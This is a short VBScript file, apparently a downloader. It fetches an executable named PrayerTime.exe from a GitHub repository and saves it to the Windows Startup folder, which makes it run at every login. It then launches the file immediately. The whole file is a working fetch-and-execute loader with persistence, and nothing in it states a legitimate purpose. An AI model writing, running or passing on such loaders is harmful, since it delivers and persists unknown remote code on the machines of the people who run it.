Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.open "GET", "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/PrayerTime.exe", False
objHTTP.send

Set objFSO = CreateObject("Scripting.FileSystemObject")
strDest = CreateObject("WScript.Shell").SpecialFolders( "Startup") & "\PrayerTime.exe"
Set objFile = objFSO.CreateTextFile(strDest, True)
objFile.Write objHTTP.responseBody
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run Chr(34) & strDest & Chr(34), 1, False
